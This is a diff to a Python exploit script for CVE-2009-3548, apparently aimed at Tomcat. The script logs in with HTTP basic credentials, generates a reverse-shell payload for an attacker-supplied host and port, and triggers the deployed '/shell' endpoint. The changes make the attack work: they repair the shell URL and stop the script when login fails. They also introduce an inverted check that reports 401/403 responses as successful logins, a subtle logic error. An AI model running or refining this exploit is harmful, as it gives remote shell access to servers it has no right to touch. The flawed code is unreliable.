@@ -6,6 +6,7 @@ import requests
 import lxml.html
 import argparse
 import string
+import sys
 from log_colors import *
 
 # CVE-2009-3548
@@ -40,10 +41,14 @@ class CVE2009_3548:
                 auth = requests.auth.HTTPBasicAuth(self.usr, self.pswd),
                 headers = self.headers
             )
-            if r.status_code != 401:
+            if r.status_code in (401, 403):
                 print (LogColors.YELLOW + "successfully login..." + LogColors.ENDC)
+            else:
+                print (LogColors.RED + "login failed :(" + LogColors.ENDC)
+                sys.exit()
         except Exception as e:
             print (LogColors.RED + "login failed :(" + LogColors.ENDC)
+            sys.exit()
 
     # generate payload with reverse shell
     def generate_payload(self, lhost, lport):
@@ -121,7 +126,7 @@ class CVE2009_3548:
     # activate your shell
     def activate_shell(self):
         r = self.session.get(
-                "http//" + self.host + ":" + self.port + "/shell",
+                "http://" + self.host + ":" + self.port + "/shell",
                 auth = requests.auth.HTTPBasicAuth(self.usr, self.pswd),
                 headers = self.headers
             )
